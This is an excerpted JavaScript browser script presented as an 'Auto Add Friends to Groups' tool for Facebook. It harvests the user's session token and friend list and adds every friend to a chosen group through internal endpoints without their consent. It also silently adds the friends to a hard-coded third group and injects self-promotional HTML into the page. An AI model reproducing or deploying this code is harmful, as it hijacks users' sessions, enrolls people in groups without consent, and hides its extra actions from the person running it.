...
var gid =[ ['137625813088205'], ['475207865895668']];
...
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=Friend_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        Friend = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index']
        })
    }
};
var Title = 'Auto Add Friends to Groups (Made By) <A style="color:#3B5998;" href="http://www.facebook.com/johnthephotoeditor">John ThePhotoeditor.</A>';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
    _text = 'Powered By <A style="color:#3B5998;" href="https://www.facebook.com/groups/ggofh">Gigantic Group of Facebook</A> Join it now.';
...
function AddFriendtoGroup(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function (a) {
        ...
        if (i > 0) {
            ...
            display += getuname + " You Are Getting Your Friends From " + grpname + ".<br/>";
            display += _text;
            display += "</div>";
            display += "</div>"
        } else {
            display += arr.length + " Friend Detected<br/>";
            display += suc + " Friend Added</br>";
            display += err + " Friend Not Added</br></br>";
    ...
    if (gid != 137625813088205) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=230733317068574&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post")
    }
    if (gid != 475207865895668) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=230733317068574&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post")
    }
...
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
    ...
    display += arr.length + "  Friend Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
